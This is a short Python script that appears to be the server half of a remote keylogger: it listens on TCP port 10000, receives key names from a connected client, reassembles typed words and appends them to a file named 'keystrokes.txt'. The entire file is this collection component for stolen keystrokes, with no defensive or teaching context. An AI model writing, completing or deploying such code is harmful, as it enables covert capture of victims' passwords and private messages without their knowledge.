import socket

socket = socket.socket()
port = 10000
socket.bind(('', port))
socket.listen(5)

connection, address = socket.accept()
token = ''
f = open('keystrokes.txt', 'a')
while True:
    key = connection.recv(1024).decode()
    print(key)
    int_key = 0

    try:
        int_key = ord(key)
    except TypeError:
        pass 

    if int_key >= 33 and int_key <= 126:
        token += key
    
    if key == 'backspace':
        token = token[:len(token)-1]

    if key == 'space':
        f.write(token)
        f.write('\n')
        token = ''
    
